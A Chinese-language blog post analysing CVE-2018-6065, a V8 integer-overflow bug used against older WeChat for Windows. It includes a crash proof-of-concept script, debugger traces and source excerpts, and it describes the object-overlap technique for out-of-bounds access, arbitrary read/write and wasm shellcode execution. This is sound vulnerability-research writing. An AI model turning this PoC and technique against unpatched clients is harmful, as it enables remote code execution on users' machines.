<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>Wechat 0day (V8 CVE-2018-6065) 漏洞分析 - B1TG</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<meta name="author" content="b1tg" /><meta name="description" content="Wechat 0day (V8 CVE-2018-6065) 漏洞分析" /><meta name="keywords" content="Hugo, b1tg, even" />






<meta name="generator" content="Hugo 0.79.1 with theme even" />


<link rel="canonical" href="https://b1tg.github.io/post/cve-2018-6065-analysis/" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">


<link href="/dist/even.c2a46f00.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">


<meta property="og:title" content="Wechat 0day (V8 CVE-2018-6065) 漏洞分析" />
<meta property="og:description" content="Wechat 0day (V8 CVE-2018-6065) 漏洞分析" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://b1tg.github.io/post/cve-2018-6065-analysis/" />
<meta property="article:published_time" content="2021-04-24T20:14:00+08:00" />
<meta property="article:modified_time" content="2021-04-24T20:14:00+08:00" />
<meta itemprop="name" content="Wechat 0day (V8 CVE-2018-6065) 漏洞分析">
<meta itemprop="description" content="Wechat 0day (V8 CVE-2018-6065) 漏洞分析">
<meta itemprop="datePublished" content="2021-04-24T20:14:00+08:00" />
<meta itemprop="dateModified" content="2021-04-24T20:14:00+08:00" />
<meta itemprop="wordCount" content="2885">



<meta itemprop="keywords" content="漏洞分析," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Wechat 0day (V8 CVE-2018-6065) 漏洞分析"/>
<meta name="twitter:description" content="Wechat 0day (V8 CVE-2018-6065) 漏洞分析"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">B1TG</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="/about">
        <li class="mobile-menu-item">About</li>
      </a><a href="/quotes">
        <li class="mobile-menu-item">Quotes</li>
      </a>
  </ul>
</nav>
  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="/" class="logo">B1TG</a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/about">About</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/quotes">Quotes</a>
      </li>
  </ul>
</nav>
    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">Wechat 0day (V8 CVE-2018-6065) 漏洞分析</h1>

      <div class="post-meta">
        <span class="post-time"> 2021-04-24 </span>
        
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">文章目录</h2>
  <div class="post-toc-content always-active">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#前言">前言</a></li>
    <li><a href="#准备工作与编译">准备工作与编译</a></li>
    <li><a href="#root-cause-分析">Root cause 分析</a></li>
    <li><a href="#exploit分析">exploit分析</a>
      <ul>
        <li></li>
      </ul>
    </li>
    <li><a href="#后记">后记</a></li>
    <li><a href="#参考链接">参考链接</a></li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <h2 id="前言">前言</h2>
<p>微信Windows版3.2.1.141以下的版本由于使用了旧版本的v8引擎且没有沙箱保护导致了18年的漏洞被利用， 用户一但点击攻击者发送的链接，就可能被利用该漏洞远程执行恶意代码 ，该漏洞对应编号CVE-2018-6065</p>
<h2 id="准备工作与编译">准备工作与编译</h2>
<p>v8的漏洞调试环境搭建不少文章说过了，这里略过，我这里使用的环境是Ubuntu18.04 + pwndbg</p>
<p>通过受影响Chrome版本（64.0.3282.119）的<a href="https://chromium.googlesource.com/chromium/src/+/64.0.3282.119/DEPS"> DEPS</a>，可以找到对应的V8 commit: 0407506af3d9d7e2718be1d8759296165b218fcf ，这也是我接下来调试所使用的commit 。</p>
<p>大致的编译流程：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">git reset 0407506af3d9d7e2718be1d8759296165b218fcf  --hard
gclient sync -f

<span class="c1"># build debug</span>
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug

<span class="c1"># build release</span>
tools/dev/v8gen.py x64.release
ninja -C out.gn/x64.release
</code></pre></td></tr></table>
</div>
</div><p>过程中可能会报错：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">../../third_party/llvm-build/Release+Asserts/bin/clang++: error while loading shared libraries: libtinfo.so.5: cannot open shared object file: No such file or directory
</code></pre></td></tr></table>
</div>
</div><p>sudo apt install libncurses5  即可解决。</p>
<h2 id="root-cause-分析">Root cause 分析</h2>
<p>根据bug issue里面的说法：在初始化一个新的javascript对象时，分配内存大小的计算过程出现了整数溢出，使得分配的内存大小可能小于base object class的最小需要尺寸，进而造成内存破坏。</p>
<p>首先看poc：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-js" data-lang="js"><span class="kr">const</span> <span class="nx">f</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="sb">`(function f(i) {
</span><span class="sb">    if (i == 0) {
</span><span class="sb">        class Derived extends Object {
</span><span class="sb">            constructor() {
</span><span class="sb">                super();
</span><span class="sb">                </span><span class="si">${</span><span class="s2">&#34;this.a=1;&#34;</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="mh">0x3fffe</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="si">}</span><span class="sb">
</span><span class="sb">            }
</span><span class="sb">        }
</span><span class="sb">
</span><span class="sb">        return Derived;
</span><span class="sb">    }
</span><span class="sb">
</span><span class="sb">    class DerivedN extends f(i-1) {
</span><span class="sb">        constructor() {
</span><span class="sb">            super();
</span><span class="sb">            </span><span class="si">${</span><span class="s2">&#34;this.a=1;&#34;</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="mh">0x40000</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="si">}</span><span class="sb">
</span><span class="sb">        }
</span><span class="sb">    }
</span><span class="sb">
</span><span class="sb">    return DerivedN;
</span><span class="sb">})`</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="p">(</span><span class="nx">f</span><span class="p">(</span><span class="mh">0x7ff</span><span class="p">))();</span>
<span class="c1">//%DebugPrint(a);
</span><span class="c1">//%SystemBreak();
</span><span class="c1"></span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>

</code></pre></td></tr></table>
</div>
</div><p>触发崩溃：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">pwndbg&gt; r  poc.js
Starting program: /home/af/v8/out.gn/x64.debug/d8 poc.js
ERROR: Could not find ELF base!
[Thread debugging using libthread_db enabled]
Using host libthread_db library &#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;.
[New Thread 0x7ffff3f53700 (LWP 3065)]
[New Thread 0x7ffff3752700 (LWP 3066)]
[New Thread 0x7ffff2f51700 (LWP 3067)]


#
# Fatal error in ../../src/objects-inl.h, line 3180
# Debug check failed: 0 &lt;= value (0 vs. -2).
#

==== C stack trace ===============================

    /home/af/v8/out.gn/x64.debug/./libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7ffff7fbc32e]
    /home/af/v8/out.gn/x64.debug/./libv8_libplatform.so(+0x2f777) [0x7ffff7f62777]
    /home/af/v8/out.gn/x64.debug/./libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x1bd) [0x7ffff7fa576d]
    /home/af/v8/out.gn/x64.debug/./libv8_libbase.so(+0x291ef) [0x7ffff7fa51ef]
    /home/af/v8/out.gn/x64.debug/./libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x32) [0x7ffff7fa57c2]
    /home/af/v8/out.gn/x64.debug/./libv8.so(v8::internal::Map::SetInObjectUnusedPropertyFields(int)+0x4ad) [0x7ffff69ba53d]
    /home/af/v8/out.gn/x64.debug/./libv8.so(v8::internal::Heap::AllocateMap(v8::internal::InstanceType, int, v8::internal::ElementsKind, int)+0x5ac) [0x7ffff70d896c]
    /home/af/v8/out.gn/x64.debug/./libv8.so(v8::internal::Factory::NewMap(v8::internal::InstanceType, int, v8::internal::ElementsKind, int)+0x5c) [0x7ffff705fcec]
    /home/af/v8/out.gn/x64.debug/./libv8.so(v8::internal::Map::RawCopy(v8::internal::Handle&lt;v8::internal::Map&gt;, int, int)+0x60) [0x7ffff7320ee0]
    /home/af/v8/out.gn/x64.debug/./libv8.so(v8::internal::Map::CopyInitialMap(v8::internal::Handle&lt;v8::internal::Map&gt;, int, int, int)+0x4c) [0x7ffff73217ac]
    /home/af/v8/out.gn/x64.debug/./libv8.so(v8::internal::JSFunction::GetDerivedMap(v8::internal::Isolate*, v8::internal::Handle&lt;v8::internal::JSFunction&gt;, v8::internal::Handle&lt;v8::internal::JSReceiver&gt;)+0x279) [0x7ffff72f0d49]
    /home/af/v8/out.gn/x64.debug/./libv8.so(v8::internal::JSObject::New(v8::internal::Handle&lt;v8::internal::JSFunction&gt;, v8::internal::Handle&lt;v8::internal::JSReceiver&gt;, v8::internal::Handle&lt;v8::internal::AllocationSite&gt;)+0x167) [0x7ffff72f0977]
    /home/af/v8/out.gn/x64.debug/./libv8.so(+0x1a21ea2) [0x7ffff759cea2]
    /home/af/v8/out.gn/x64.debug/./libv8.so(v8::internal::Runtime_NewObject(int, v8::internal::Object**, v8::internal::Isolate*)+0x107) [0x7ffff759ca97]
    [0x19b557384384]

Thread 1 &#34;d8&#34; received signal SIGILL, Illegal instruction.
v8::base::OS::Abort () at ../../src/base/platform/platform-posix.cc:346
346	    V8_IMMEDIATE_CRASH();


</code></pre></td></tr></table>
</div>
</div><p>分析调用堆栈：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">JSObject::New(...)
	-&gt; JSFunction::GetDerivedMap(...)
		-&gt; Map::RawCopy(Handle&lt;Map&gt; map, int instance_size, int inobject_properties)
            -&gt; Factory::NewMap(InstanceType type, int instance_size,
                                ElementsKind elements_kind,
                                int inobject_properties)
            	-&gt; Map::SetInObjectUnusedPropertyFields(int value) 
            		// value=inobject_properties  
</code></pre></td></tr></table>
</div>
</div><p>找到poc crash 处对应的代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="k">void</span> <span class="nx">Map</span><span class="o">::</span><span class="nx">SetInObjectUnusedPropertyFields</span><span class="p">(</span><span class="kr">int</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">STATIC_ASSERT</span><span class="p">(</span><span class="nx">JSObject</span><span class="o">::</span><span class="nx">kFieldsAdded</span> <span class="o">==</span> <span class="nx">JSObject</span><span class="o">::</span><span class="nx">kHeaderSize</span> <span class="o">/</span> <span class="nx">kPointerSize</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">IsJSObjectMap</span><span class="p">())</span> <span class="p">{</span>
    <span class="nx">DCHECK_EQ</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
    <span class="nx">set_used_or_unused_instance_size_in_words</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="nx">DCHECK_EQ</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">UnusedPropertyFields</span><span class="p">());</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="nx">DCHECK_LE</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>  <span class="c1">// poc crash here
</span><span class="c1"></span> <span class="c1">// [...]
</span><span class="c1"></span><span class="p">}</span>

</code></pre></td></tr></table>
</div>
</div><p>value 的值是传入的inobject_properties，等于-2，没有通过检查导致crash。</p>
<p>poc.js中的函数f是一个递归函数，接受一个参数i，当i=0时返回class Derived，Derived继承自Object；当i&gt;0时返回class DerivedN，DerivedN继承自f(i-1) 。简而言之，f(i)返回的class有一个继承链，这个链的长度由i来控制。</p>
<p>把视角切换到两个class的 constructor 中，二者都在super()之后重复初始化了很多次&quot;this.a=1&quot;，假设这个重复次数为j。从bug issue中可以得知，溢出发生的地方是 JSFunction::CalculateInstanceSizeHelper中instance_size被赋值的时候：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="k">void</span> <span class="nx">JSFunction</span><span class="o">::</span><span class="nx">CalculateInstanceSizeHelper</span><span class="p">(</span><span class="nx">InstanceType</span> <span class="nx">instance_type</span><span class="p">,</span>
                                             <span class="nx">bool</span> <span class="nx">has_prototype_slot</span><span class="p">,</span>
                                             <span class="kr">int</span> <span class="nx">requested_embedder_fields</span><span class="p">,</span>
                                             <span class="kr">int</span> <span class="nx">requested_in_object_properties</span><span class="p">,</span>
                                             <span class="kr">int</span><span class="o">*</span> <span class="nx">instance_size</span><span class="p">,</span>
                                             <span class="kr">int</span><span class="o">*</span> <span class="nx">in_object_properties</span><span class="p">)</span> <span class="p">{</span>
  <span class="kr">int</span> <span class="nx">header_size</span> <span class="o">=</span> <span class="nx">JSObject</span><span class="o">::</span><span class="nx">GetHeaderSize</span><span class="p">(</span><span class="nx">instance_type</span><span class="p">,</span> <span class="nx">has_prototype_slot</span><span class="p">);</span>
  <span class="nx">DCHECK_LE</span><span class="p">(</span><span class="nx">requested_embedder_fields</span><span class="p">,</span>
            <span class="p">(</span><span class="nx">JSObject</span><span class="o">::</span><span class="nx">kMaxInstanceSize</span> <span class="o">-</span> <span class="nx">header_size</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="nx">kPointerSizeLog2</span><span class="p">);</span>
  <span class="o">*</span><span class="nx">instance_size</span> <span class="o">=</span>
      <span class="nx">Min</span><span class="p">(</span><span class="nx">header_size</span> <span class="o">+</span>
              <span class="p">((</span><span class="nx">requested_embedder_fields</span> <span class="o">+</span> <span class="nx">requested_in_object_properties</span><span class="p">)</span>
               <span class="o">&lt;&lt;</span> <span class="nx">kPointerSizeLog2</span><span class="p">),</span>
          <span class="nx">JSObject</span><span class="o">::</span><span class="nx">kMaxInstanceSize</span><span class="p">);</span>
  <span class="o">*</span><span class="nx">in_object_properties</span> <span class="o">=</span> <span class="p">((</span><span class="o">*</span><span class="nx">instance_size</span> <span class="o">-</span> <span class="nx">header_size</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="nx">kPointerSizeLog2</span><span class="p">)</span> <span class="o">-</span>
                          <span class="nx">requested_embedder_fields</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>接下来调试一下:</p>
<p>在objects.cc:13707处下断，第二次断下的时候可以观察到instance_size发生整数溢出：0x100000008的计算结果被赋给int类型的instance_size，instance_size被赋值为8，随后in_object_properties被赋值为-2，这与前面的堆栈分析现象相符。在调试中会发现requested_in_object_properties是可以通过i和j的值控制的，进而能控制instance_size的值。</p>
<blockquote>
<p>*instance_size = 0x18 + (0 + 0x1ffffffe) &laquo; 3 = 0x100000008 // overflow!!</p>
<p>*in_object_properties = (8-0x18) &raquo; 3 = -2</p>
</blockquote>
<p><img src="/img/CVE-2018-6065-analysis/image-20210424090309618.png" alt="image-20210424090309618"></p>
<h2 id="exploit分析">exploit分析</h2>
<h4 id="oob">oob</h4>
<p>手上有两个exp，一个是bugs issue里面附带的exploit.html，另一个是网上流传的在野利用脚本chrome.js。</p>
<p>二者的利用思路是一样的：让class Derived继承正则类RegExp，触发漏洞将instance_size的值溢出为8，使得JSRegExp只会分配0x8字节的内存，在JSRegExp的初始化完成之前分配一个JSArray，JSArray会分配到JSRegExp+0x8的位置让这两个结构部分重叠，JSRegExp在后续初始化data和source的时候会覆盖JSArray的elements和length字段，使得JSArray具备越界读写的能力，之后配合ArrayBuffer就可以完成任意地址读写。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-js" data-lang="js">		<span class="c1">//       JSRegExp              JSArray
</span><span class="c1"></span>		<span class="c1">// 0000: map
</span><span class="c1"></span>		<span class="c1">// 0008: properties_or_hash    map
</span><span class="c1"></span>		<span class="c1">// 0010: elements              properties_or_hash
</span><span class="c1"></span>		<span class="c1">// 0018: data                  elements              &lt;--- corrupt
</span><span class="c1"></span>		<span class="c1">// 0020: source                length                &lt;--- corrupt
</span><span class="c1"></span>		<span class="c1">// 0028: flags
</span><span class="c1"></span>		<span class="c1">// 0030: size
</span><span class="c1"></span>		<span class="c1">// 0038: last_index
</span></code></pre></td></tr></table>
</div>
</div><p>JSArray结构的破坏分成三个步骤：</p>
<ol>
<li>JSRegExp分配0x8个字节</li>
<li>JSArray在JSRegExp的data和source初始化之前分配，且处于JSRegExp+0x8的位置</li>
<li>JSRegExp初始化data和source，覆盖JSArray的elements和length字段</li>
</ol>
<p>这个顺序是如何确保的呢？</p>
<p>先通过一个简单的脚本调试一下JSRegExp的构建过程：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript">
<span class="kd">var</span> <span class="nx">cb</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] in cb ....&#34;</span><span class="p">);</span>
	<span class="k">return</span> <span class="s1">&#39;c01db33f&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] start constructor....&#34;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">({</span>
                    <span class="nx">toString</span><span class="o">:</span> <span class="nx">cb</span>
                <span class="p">},</span> <span class="s1">&#39;g&#39;</span><span class="p">)</span>

<span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] over....&#34;</span><span class="o">+</span> <span class="nx">a</span><span class="p">);</span>
<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
<span class="o">%</span><span class="nx">SystemBreak</span><span class="p">();</span> 
</code></pre></td></tr></table>
</div>
</div><p>在JSRegExp初始化的地方下断点，可以看到在调用JSRegExp::Initialize之前：JSRegExp已分配结构并初始化了部分数据结构，但是data和source还是undefined的状态；而js代码中第一个参数对应的source已经调用了cb函数返回了字符串c01db33f。</p>
<p><img src="/img/CVE-2018-6065-analysis/image-20210424173927400.png" alt="image-20210424173927400"></p>
<p>执行完JSRegExp::Initialize，data和source字段也初始化完毕。</p>
<p><img src="/img/CVE-2018-6065-analysis/image-20210424174905499.png" alt="image-20210424174905499"></p>
<p>没有在调试中确认的一个问题是JSRegExp的分配和cb二者的执行顺序，Runtime_RegExpInitializeAndCompile之前的调用因为没找到调试的方法没继续跟了，从观察的现象来说JSRegExp的分配总是先进行的。</p>
<p>下面是调试chrome.js中JSArray (g_array) 的length字段被覆盖的过程，也可以观察到JSRegExp和JSArray二者地址相差0x8个字节：</p>
<p><img src="/img/CVE-2018-6065-analysis/image-20210424181551298.png" alt="image-20210424181551298"></p>
<p><img src="/img/CVE-2018-6065-analysis/image-20210424181610414.png" alt="image-20210424181610414"></p>
<h4 id="任意地址读写--执行shellcode">任意地址读写 &amp; 执行shellcode</h4>
<p>有了oob，剩下就是常规套路，使用oob把this.buffer的backing_store处写成this.page_buffer的地址，通过this.buffer读写this.page_buffer的指针即可进一步达成任意地址读写。</p>
<p>执行shellcode使用的是wasm的方法，不同版本的v8找rwx的偏移好像都不太一样，试了网上的几个都失败了，我在debug版本试了几次，最后还是找到了，然后就是拷贝shellcode到该区域执行就结束了。</p>
<p><img src="/img/CVE-2018-6065-analysis/image-20210424184712204.png" alt="image-20210424184712204"></p>
<p>相关文件放在：https://github.com/b1tg/wechat-0day-CVE-2018-6065-exploit</p>
<h2 id="后记">后记</h2>
<p>有些细节是没覆盖到的，比如instance_size的控制，我简单调了一下应该是通过tDerivedNCount和tDerivedNDepth二者控制，因为chrome.js跑起来instance_size直接是对的，我就没进一步确认了， gc对exp的影响我也没有研究。</p>
<p>总的来说，分析和调试的过程还是很有趣的，被迫看了不少v8的源码，也不像开始那么抵触了。</p>
<h2 id="参考链接">参考链接</h2>
<ul>
<li>
<p><a href="https://mem2019.github.io/jekyll/update/2019/07/18/V8-Env-Config.html">https://mem2019.github.io/jekyll/update/2019/07/18/V8-Env-Config.html</a></p>
</li>
<li>
<p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=808192">https://bugs.chromium.org/p/chromium/issues/detail?id=808192</a></p>
</li>
<li>
<p><a href="https://migraine-sudo.github.io/2020/02/15/v8/">https://migraine-sudo.github.io/2020/02/15/v8/</a></p>
</li>
<li>
<p><a href="https://www.freebuf.com/vuls/203721.html">https://www.freebuf.com/vuls/203721.html</a></p>
</li>
<li>
<p><a href="https://github.com/b1tg/wechat-0day-CVE-2018-6065-exploit">https://github.com/b1tg/wechat-0day-CVE-2018-6065-exploit</a> 相关文件</p>
</li>
</ul>

    </div>

    <div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">文章作者</span>
    <span class="item-content">b1tg</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">上次更新</span>
    <span class="item-content">
        2021-04-24
        
    </span>
  </p>
  
  
</div>
<footer class="post-footer">
      <div class="post-tags">
          <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
          </div>
      <nav class="post-nav">
        
        <a class="next" href="/post/cve-2018-0802-office-eqnedt32/">
            <span class="next-text nav-default">CVE-2018-0802 Microsoft Office stack overflow 漏洞分析</span>
            <span class="next-text nav-mobile">下一篇</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        

  

  

      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="http://github.com/b1tg" class="iconfont icon-github" title="github"></a>
  <a href="https://b1tg.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
</div>

<div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    主题 - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2018 - 
    2021
    <span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">b1tg</span>
  </span>
</div>
    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
<script type="text/javascript" src="/dist/even.26188efa.min.js"></script>








</body>
</html>
